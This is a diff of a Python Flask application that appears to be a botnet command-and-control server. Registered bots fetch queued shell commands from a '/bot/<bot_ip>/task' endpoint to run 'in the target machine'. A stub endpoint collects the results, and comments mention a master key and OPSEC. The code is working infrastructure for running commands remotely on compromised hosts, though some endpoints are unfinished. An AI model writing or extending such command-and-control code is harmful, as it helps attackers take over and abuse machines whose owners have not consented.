@@ -26,8 +26,12 @@ class Bot(db.Model):
     id = db.Column('bot_id', db.Integer, primary_key=True)
     ip = db.Column(db.String(128))
     os = db.Column(db.String(128))
-    # TODO: This might have to change later 
+    # cmds is a "list" of "Command" Model. The cmds and the bot_id from Command Model 
+    # shows the one-to-many foreign key relationship between two tables. 
     cmds = db.relationship('Command', backref='bot', lazy=True)
+
+    #TODO: Implement 'bot_unique_key' for authentication? 
+    #unique_key = db.Column(db.String(128), default=<random_hash_created>)
 
     def __init__(self, ip, os):
         self.ip = ip 
@@ -192,44 +196,6 @@ def register():
     except Exception as e:
         return '' 
 
-# TODO: Change this to POST, and add botkey for "authentication" <-- lmao
-# TODO: Implement this API endpoint  
-@app.route('/bot/<bot_ip>/task', methods=['POST'])
-def bottask(bot_ip):
-    #query_bot = Bot.query.filter_by(ip=bot_ip).first()
-    #cmd = query_bot.cmds
-
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
-
-    data = request.form
-    registerkey = data['registerkey']
-
-    try:
-        if data is None:
-            return jsonify({'error': 'Could not process body parameters'})
-        if registerkey is None:
-            return jsonify({'error': 'regsiterkey is required'})
-
-        # Get the bot corresponding with the bot_ip 
-        query_bot = Bot.query.filter_by(ip=bot_ip).first()
-
-        # Try getting commands, from the oldest staged command to the lastest staged command. 
-        try:
-            # FILO - Stack, first in, last out (last = most recent)
-            command = query_bot.cmds[0]
-        except Exception as e:
-            return jsonify({'error': 'There are no commands available'})
-
-        query_bot.cmds.remove(command)
-        db.session.commit()
-
-        return command.cmd
-
-
-    except Exception as e:
-        return str(e) 
-
 # TODO: Should it be bot_id ? Or bot_ip? Which one makes logical sense?
 @app.route('/bot/<bot_id>/push', methods=['POST'])
 def botpush(bot_id):
@@ -285,6 +251,79 @@ def botpush(bot_id):
         return '' 
     #command = Command()
 
+# TODO: Change this to POST, and add botkey for "authentication" <-- lmao
+# TODO: Implement this API endpoint  
+@app.route('/bot/<bot_ip>/task', methods=['POST'])
+def bottask(bot_ip):
+    """
+    Description: Shows the command that is staged for the corresponding bot. 
+    The bot will visit this endpoint, retrieve the command, and execute it in the 
+    target machine 
+
+    [POST]
+        - regsiterkey = "Authentication" key for the bot  
+    """
+
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+    data = request.form
+    registerkey = data['registerkey']
+
+    try:
+        if data is None:
+            return jsonify({'error': 'Could not process body parameters'})
+        if registerkey is None:
+            return jsonify({'error': 'regsiterkey is required'})
+
+        # Get the bot corresponding with the bot_ip 
+        query_bot = Bot.query.filter_by(ip=bot_ip).first()
+
+        # Try getting commands, from the oldest staged command to the lastest staged command. 
+        try:
+            # FILO - Stack, first in, last out (last = most recent)
+            command = query_bot.cmds[0]
+        except Exception as e:
+            return jsonify({'error': 'There are no commands available'})
+
+        query_bot.cmds.remove(command)
+        db.session.commit()
+
+        return command.cmd
+
+
+    except Exception as e:
+        return str(e) 
+
+@app.route('/bot/<bot_ip>/result', methods=['POST'])
+def botresult():
+    """
+    Description: API endpoint which the bot comes and reports the result of the staged command. 
+    If a bot visits, the endpoint will update the result of the Command Model of the corresponding bot. 
+
+    If a master visits, the endpoint will show the result.
+
+    [POST]
+        - key = Either bot_unique_key or masterkey. Endpoint's behavior changes correspondingly 
+        - result = 
+    """
+
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+    data = request.form
+
+    if 'registerkey' in data:
+        # TODO: Do the bot thing~ 
+        pass
+    elif 'masterkey' in data:
+        # TODO: Do the master thing~ 
+        pass 
+    else:
+        return jsonify({'error': 'reigsterkey/masterkey cannot be empty'})
+    
+
+    pass
 
 # TODO: Change to POST, implement master authentication for OPSEC 
 @app.route('/bot/list', methods=['GET'])
